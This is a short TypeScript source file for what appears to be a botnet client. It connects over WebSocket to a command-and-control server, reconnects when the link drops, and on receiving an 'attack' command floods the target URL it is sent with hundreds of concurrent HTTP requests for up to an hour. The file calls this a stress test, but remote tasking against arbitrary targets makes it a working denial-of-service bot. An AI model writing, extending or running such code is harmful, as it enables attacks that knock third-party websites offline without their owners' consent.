import { sleep } from "bun";

const C2_URL = "ws://localhost:3000";
let socket: WebSocket;

function connect() {
  socket = new WebSocket(C2_URL);

  socket.onopen = () => {
    console.log("Connected to C2");
  };

  socket.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === "attack") {
        if (!data.target || !data.target.startsWith("http")) {
          console.error("Invalid target:", data.target);
          return;
        }
        startAttack(data.target, data.duration, data.concurrency || 10);
      }
    } catch (e) {
      console.error("Failed to parse message", e);
    }
  };

  socket.onclose = () => {
    console.log("Disconnected. Reconnecting...");
    setTimeout(connect, 5000);
  };

  socket.onerror = (err) => {
    console.error("Socket error", err);
  };
}

async function startAttack(target: string, duration: number, concurrency: number) {
  console.log(`Starting stress test on ${target} for ${duration}s with concurrency ${concurrency}`);
  const endTime = Date.now() + Math.min(duration, 3600) * 1000; // Cap at 1 hour
  const safeConcurrency = Math.min(concurrency, 500); // Cap workers
  
  const worker = async () => {
    while (Date.now() < endTime) {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout
        
        await fetch(target, { 
          mode: 'no-cors',
          signal: controller.signal,
          headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SYSTUMMM-BOT/1.0' }
        }).catch(() => {});
        
        clearTimeout(timeoutId);
      } catch (e) {}
      await sleep(10); // Slight delay to prevent CPU lockup
    }
  };

  const workers = Array.from({ length: safeConcurrency }, () => worker());
  await Promise.all(workers);
  
  console.log("Attack finished");
}

connect();
